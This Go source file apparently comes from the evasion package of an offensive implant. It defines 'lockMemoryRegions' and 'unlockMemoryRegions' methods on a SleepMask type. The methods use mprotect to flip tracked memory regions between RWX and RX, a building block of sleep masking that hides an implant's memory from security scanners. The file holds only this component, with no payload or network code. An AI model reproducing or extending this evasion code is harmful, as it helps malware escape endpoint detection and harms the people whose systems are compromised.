//go:build linux || darwin

package evasion

import (
	"syscall"
	"unsafe"
)

// lockMemoryRegions changes memory protection from RWX to RX using mprotect.
func (sm *SleepMask) lockMemoryRegions() {
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.size == 0 {
			continue
		}
		pageSize := syscall.Getpagesize()
		addr := r.addr & ^(uintptr(pageSize) - 1)
		size := ((r.size + pageSize - 1) / pageSize) * pageSize
		slice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
		syscall.Mprotect(slice, syscall.PROT_READ|syscall.PROT_EXEC)
	}
}

// unlockMemoryRegions changes memory protection from RX back to RWX.
func (sm *SleepMask) unlockMemoryRegions() {
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.size == 0 {
			continue
		}
		pageSize := syscall.Getpagesize()
		addr := r.addr & ^(uintptr(pageSize) - 1)
		size := ((r.size + pageSize - 1) / pageSize) * pageSize
		slice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
		syscall.Mprotect(slice, syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC)
	}
}

var _ = unsafe.Pointer(nil)
